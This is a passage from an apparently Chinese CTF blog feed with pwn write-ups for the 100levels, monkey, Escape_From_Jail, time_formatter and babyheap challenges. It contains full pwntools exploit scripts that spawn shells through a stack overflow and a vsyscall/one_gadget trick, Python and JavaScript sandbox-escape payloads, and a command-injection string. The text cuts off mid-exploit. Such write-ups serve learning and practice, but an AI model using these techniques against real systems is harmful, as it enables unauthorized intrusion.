&apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&apos;os&apos;]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>参考：<br><a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape</a><br><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F" target="_blank" rel="noopener">https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F</a><br><a href="http://yulige.top/?p=502" target="_blank" rel="noopener">http://yulige.top/?p=502</a></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>攻防世界-pwn prac</title>
      <link href="/2019/04/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-prac/"/>
      <url>/2019/04/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-prac/</url>
      <content type="html"><![CDATA[<h1 id="100levels"><a href="#100levels" class="headerlink" title="100levels"></a>100levels</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>检查<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><p>两个功能： go hint</p><p>go:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall go(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // ST0C_4</span><br><span class="line">  __int64 v4; // [rsp+0h] [rbp-120h]</span><br><span class="line">  __int64 num2; // [rsp+0h] [rbp-120h]</span><br><span class="line">  int v6; // [rsp+8h] [rbp-118h]</span><br><span class="line">  __int64 num1; // [rsp+10h] [rbp-110h]</span><br><span class="line">  signed __int64 num1a; // [rsp+10h] [rbp-110h]</span><br><span class="line">  signed __int64 cnt; // [rsp+18h] [rbp-108h]</span><br><span class="line">  __int64 v10; // [rsp+20h] [rbp-100h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;How many levels?&quot;);</span><br><span class="line">  v4 = get_num();</span><br><span class="line">  if ( v4 &gt; 0 )</span><br><span class="line">    num1 = v4;</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Coward&quot;);</span><br><span class="line">  puts(&quot;Any more?&quot;);</span><br><span class="line">  num2 = get_num();</span><br><span class="line">  num1a = num1 + num2;</span><br><span class="line">  if ( num1a &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( num1a &lt;= 99 )</span><br><span class="line">    &#123;</span><br><span class="line">      cnt = num1a;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You are being a real man.&quot;);</span><br><span class="line">      cnt = 100LL;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Let&apos;s go!&apos;&quot;);</span><br><span class="line">    v6 = time(0LL);</span><br><span class="line">    if ( (unsigned int)check(cnt) != 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(0LL);</span><br><span class="line">      sprintf((char *)&amp;v10, &quot;Great job! You finished %d levels in %d seconds\n&quot;, cnt, (unsigned int)(v3 - v6), num2);</span><br><span class="line">      puts((const char *)&amp;v10);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You failed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;Coward Coward Coward Coward Coward&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>go调用的check<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall check(signed int cnt)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // eax</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  __int64 buf; // [rsp+10h] [rbp-30h]</span><br><span class="line">  __int64 v5; // [rsp+18h] [rbp-28h]</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-20h]</span><br><span class="line">  __int64 v7; // [rsp+28h] [rbp-18h]</span><br><span class="line">  unsigned int v8; // [rsp+34h] [rbp-Ch]</span><br><span class="line">  unsigned int num2; // [rsp+38h] [rbp-8h]</span><br><span class="line">  unsigned int num1; // [rsp+3Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  buf = 0LL;</span><br><span class="line">  v5 = 0LL;</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  v7 = 0LL;</span><br><span class="line">  if ( !cnt )</span><br><span class="line">    return 1LL;</span><br><span class="line">  if ( (unsigned int)check(cnt - 1) == 0 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  num1 = rand() % cnt;</span><br><span class="line">  v2 = rand();</span><br><span class="line">  num2 = v2 % cnt;</span><br><span class="line">  v8 = v2 % cnt * num1;</span><br><span class="line">  puts(&quot;====================================================&quot;);</span><br><span class="line">  printf(&quot;Level %d\n&quot;, (unsigned int)cnt);</span><br><span class="line">  printf(&quot;Question: %d * %d = ? Answer:&quot;, num1, num2);</span><br><span class="line">  read(0, &amp;buf, 0x400uLL);                      // overflow</span><br><span class="line">  v3 = strtol((const char *)&amp;buf, 0LL, 10);</span><br><span class="line">  return v3 == v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>hint<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int hint()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v1; // [rsp+8h] [rbp-108h]</span><br><span class="line">  int v2; // [rsp+10h] [rbp-100h]</span><br><span class="line">  __int16 v3; // [rsp+14h] [rbp-FCh]</span><br><span class="line"></span><br><span class="line">  if ( flag )</span><br><span class="line">  &#123;</span><br><span class="line">    sprintf((char *)&amp;v1, &quot;Hint: %p\n&quot;, &amp;system, &amp;system);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = &apos;N NWP ON&apos;;</span><br><span class="line">    v2 = &apos;UF O&apos;;</span><br><span class="line">    v3 = &apos;N&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">  return puts((const char *)&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>容易发现的漏洞就是check时的溢出，还有问题就是go初始时输入两次值，最后使用的是两次加起来的值，但是如果第一次输入的值小于等于0就不会初始化第一个值。</p><p>最刚开始的想法是通过溢出修改存储在bss段的flag位然后返回到主函数，再使用hint泄露system函数地址<br>但是因为程序开启了pie，因此bss段位置也就是不定的，而如果想要泄露libc，又因为是64位程序，因此需要gadget，但是gadgets的位置也因为pie变得位置不定，所以行不通。</p><p>再观察程序，发现：<br>hint函数是先将system函数地址读到了栈上，之后调用fprintf函数输出的，其地址为rbp-0x110<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_110         = qword ptr -110h</span><br><span class="line"></span><br><span class="line">mov     rax, cs:system_ptr</span><br><span class="line">mov     [rbp+var_110], rax</span><br></pre></td></tr></table></figure></p><p>而如果go读取的第一个数没有初始化的话，他的值就是栈上的值，而它的地址恰巧也是rbp-0x110<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__int64 num1; // [rsp+10h] [rbp-110h]</span><br></pre></td></tr></table></figure></p><p>所以我们按理说是可以利用那个对大小判断的函数来逐位爆破system的地址<br>这里需要注意的是如果和大于0进入check，如果顺着令其运行完会直接退出，所以也需要在check中溢出覆盖返回地址以便能够继续爆破</p><p>而覆盖的返回地址依旧是不确定的，观察程序运行时的内存映射，发现程序的最后vsyscall段是恒定不变的，我们可以利用它来绕过pie；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10i 0xffffffffff600400</span><br><span class="line">   0xffffffffff600400:mov    rax,0xc9</span><br><span class="line">   0xffffffffff600407:syscall </span><br><span class="line">   0xffffffffff600409:ret    </span><br><span class="line">   0xffffffffff60040a:int3   </span><br><span class="line">   0xffffffffff60040b:int3</span><br></pre></td></tr></table></figure></p><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>思路一没有复现成功，看到了大佬们的简单一点的思路</p><p>前面基本一致，但是不再去爆破system的地址，而是将其覆盖位one_gadget的地址，也就是计算二者偏移的差值然后将其加上去直接得到one_gadget RCE,可以看到这个地址被存放在了栈上，我们的目标就是在后面的栈溢出中想办法使得返回到此处。</p><p>执行最后一次时的栈情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">03:0018│ rsi  0x7ffe36cd7780 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">07:0038│      0x7ffe36cd77a0 ◂— 0x1ae00000000</span><br><span class="line">08:0040│      0x7ffe36cd77a8 ◂— 0x2b0000000a /* &apos;\n&apos; */</span><br><span class="line">09:0048│ rbp  0x7ffe36cd77b0 —▸ 0x7ffe36cd78e0 —▸ 0x7ffe36cd7920 —▸ 0x556f0672efd0 ◂— push   r15</span><br><span class="line">0a:0050│      0x7ffe36cd77b8 —▸ 0x556f0672ec8a ◂— test   eax, eax</span><br><span class="line">0b:0058│      0x7ffe36cd77c0 ◂— 0xfffffffffffffeda</span><br><span class="line">0c:0060│      0x7ffe36cd77c8 ◂— 0x556f5caa9f45       -------》 one_gadget 在这里</span><br></pre></td></tr></table></figure></p><p>我们就可以使用vsyscall中的不变量来使返回地址滑向此处执行one_gadget</p><ul><li>关于 vsyscall</li></ul><p>简单地说，现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">system_offset = 0x45390</span><br><span class="line">ret_address = 0xffffffffff600400</span><br><span class="line">target_offset = 0x4526a</span><br><span class="line"></span><br><span class="line">difference = target_offset - system_offset</span><br><span class="line"></span><br><span class="line">def answer(eqn):</span><br><span class="line">    parse = eqn[9:eqn.find(&quot;=&quot;)]</span><br><span class="line">    soln = eval(parse)</span><br><span class="line">    return soln</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    p = process(&quot;./100levels&quot;)</span><br><span class="line">    #p = remote(&quot;47.74.147.103&quot;, 20001)</span><br><span class="line"></span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(&quot;0&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(str(difference))</span><br><span class="line"></span><br><span class="line">    for i in range(99):</span><br><span class="line">        p.recvline_contains(&quot;Level&quot;)</span><br><span class="line">        eqn = p.clean()</span><br><span class="line"></span><br><span class="line">        soln = answer(eqn)</span><br><span class="line">        p.send(str(soln)+&quot;\x00&quot;)</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">    pay = str(soln) + &quot;\x00&quot;</span><br><span class="line">    pay = pay.ljust(56, &quot;B&quot;)</span><br><span class="line">    pay += p64(ret_address)*3</span><br><span class="line">    log.info(&quot;Injected our vsyscall ROPs&quot;)</span><br><span class="line"></span><br><span class="line">    p.send(pay)</span><br><span class="line">    p.clean()</span><br><span class="line"></span><br><span class="line">    p.success(&quot;Shell spawned! Enjoy!&quot;)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>未成功的思路一</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">sh=process(&apos;./100levels&apos;)</span><br><span class="line">#sh=remote(&apos;111.198.29.45&apos;,&apos;32440&apos;)</span><br><span class="line">elf = ELF(&apos;./100levels&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so&apos;)</span><br><span class="line"></span><br><span class="line">def go(level,more):</span><br><span class="line">sh.recvuntil(&apos;Choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;levels?\n&apos;)</span><br><span class="line">sh.sendline(str(level))</span><br><span class="line">sh.recvuntil(&apos;more?\n&apos;)</span><br><span class="line">sh.sendline(str(more))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def hint():</span><br><span class="line">sh.sendlineafter(&apos;Choice:\n&apos;,&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">def calc(answer):</span><br><span class="line">sh.sendlineafter(&apos;Answer:&apos;,answer)</span><br><span class="line"></span><br><span class="line">def leak():</span><br><span class="line">start = 0x700000000390</span><br><span class="line">for i in range(10,2,-1):</span><br><span class="line">for j in range(15,-1,-1):</span><br><span class="line">hint()</span><br><span class="line">addr_test = start+(1 &lt;&lt; (i*4)*j)</span><br><span class="line">go(0,-addr_test)</span><br><span class="line">a = sh.recvline()</span><br><span class="line"></span><br><span class="line">if &apos;Coward&apos; not in a:</span><br><span class="line">                start = addr_test</span><br><span class="line">log.info(&apos;check &apos;+ hex(addr_test))</span><br><span class="line">                break</span><br><span class="line">        pro = log.progress(&apos;go&apos;)</span><br><span class="line">        for i in range(99):</span><br><span class="line">            pro.status(&apos;level %d&apos;%(i+1))</span><br><span class="line">            calc(p64(0)*5)</span><br><span class="line">        #gdb.attach(sh)</span><br><span class="line">calc(p64(0)*5+p64(0xffffffffff600400)*3)</span><br><span class="line">       #gdb.attach(sh)</span><br><span class="line">pro.success(&apos;ok&apos;)</span><br><span class="line">return start + 0x100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system=leak()</span><br><span class="line">print system</span><br><span class="line"></span><br><span class="line">binsh_addr = system - libc.symbols[&apos;system&apos;]+libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">pop_rdi_ret = system - libc.symbols[&apos;system&apos;]+0x21102</span><br><span class="line"></span><br><span class="line">pay = p64(pop_rdi_ret)+p64(binsh_addr)+p64(system)</span><br><span class="line">go(1,0)</span><br><span class="line">pay = &apos;0&apos;*0x38+pay</span><br><span class="line">calc(pay)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://bbs.ichunqiu.com/thread-43627-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-43627-1-1.html</a><br><a href="https://nandynarwhals.org/hitbgsec2017-1000levels/" target="_blank" rel="noopener">https://nandynarwhals.org/hitbgsec2017-1000levels/</a><br><a href="https://znqt.github.io/hitb-gsec-pwn-1000levels/" target="_blank" rel="noopener">https://znqt.github.io/hitb-gsec-pwn-1000levels/</a></p><h1 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h1><h2 id="题目-amp-分析-amp-exp"><a href="#题目-amp-分析-amp-exp" class="headerlink" title="题目 &amp; 分析 &amp; exp"></a>题目 &amp; 分析 &amp; exp</h2><p>算是js的沙箱逃逸，给了个The SpiderMonkey shell，可以查询到它的源码之类的东西，<br>可以发现其没有任何过滤，所以给个os.system(“/bin/sh”) 直接拿shell即可</p><h1 id="Escape-From-Jail-50"><a href="#Escape-From-Jail-50" class="headerlink" title="Escape_From_Jail-50"></a>Escape_From_Jail-50</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>python沙箱逃逸，只给了个远程连接，检测到被过滤的字符会报错</p><p>banned：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.  / &apos; /  import /flag /eval /exec / dir(__builtins__)无反馈 等等</span><br></pre></td></tr></table></figure></p><h2 id="分析-amp-exp"><a href="#分析-amp-exp" class="headerlink" title="分析 &amp; exp"></a>分析 &amp; exp</h2><p>许多常见的基本上都被过滤了</p><p>不能使用import关键字且不允许使用 “.”，一大部分路就被绝了,</p><p>os，未被过滤，但是基本调用需要”.”,所以需要其他方式。</p><p>查询资料发现 getattr函数可以使用</p><p>相关资料可以看菜鸟：<a href="http://www.runoob.com/python/python-func-getattr.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-getattr.html</a></p><p>getattr(os,”system”)(“/bin/sh”)</p><h1 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time_formatter"></a>time_formatter</h1><p>比较有意思的一个题目，刚开始没看懂题。。</p><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall print(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // r8</span><br><span class="line">  char command; // [rsp+8h] [rbp-810h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+808h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  if ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(&amp;command, 2048LL, 1LL, 2048LL, &quot;/bin/date -d @%d +&apos;%s&apos;&quot;, (unsigned int)time, ptr, a3);</span><br><span class="line">    __printf_chk(1LL, &quot;Your formatted time is: &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    if ( getenv(&quot;DEBUG&quot;) )</span><br><span class="line">      __fprintf_chk(stderr, 1LL, &quot;Running command: %s\n&quot;, &amp;command, v3);</span><br><span class="line">    setenv(&quot;TZ&quot;, value, 1);</span><br><span class="line">    system(&amp;command);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;You haven&apos;t specified a format!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>退出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __noreturn exit()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; // rax</span><br><span class="line">  char s; // [rsp+8h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v2; // [rsp+18h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  free__(ptr);</span><br><span class="line">  free__(value);</span><br><span class="line">  __printf_chk(1LL, &quot;Are you sure you want to exit (y/N)? &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  result = 0LL;</span><br><span class="line">  if ( (s &amp; 0xDF) == 89 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;OK, exiting.&quot;);</span><br><span class="line">    result = 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-amp-amp-exp"><a href="#分析-amp-amp-exp" class="headerlink" title="分析&amp;&amp;exp"></a>分析&amp;&amp;exp</h2><p>问题出在退出时先free然后再询问是否退出，这个时候选择不退出的话就会出现UAF漏洞</p><p>在system中执行command命令，command字符串通过snprintf_chk函数拼接起来，可以百度一下这个函数的用法，注意字符串/bin/date -d @%d +’%s’，按照linux 64的函数传参顺序，分别是rdi rsi rdx rcx r8 r9 然后是栈 ，所以此时%s对应第一个入栈的参数，也就是rax 也就是qword_602118，所以只要控制了qword_602118，就可以执行任意系统命令（注意闭合单引号）。</p><p>所以依次执行 1，5 / N ，3 / ‘;/bin/sh#’ , 4 即可</p><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h2 id="题目-amp-amp-分析"><a href="#题目-amp-amp-分析" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>正常题目，edit时没有检查存储的size</p><p>所以虽然保护全开，我们仍然可以使用溢出来overlap来泄露地址及其他</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#sh=process(&apos;./babyheap&apos;)</span><br><span class="line">sh = 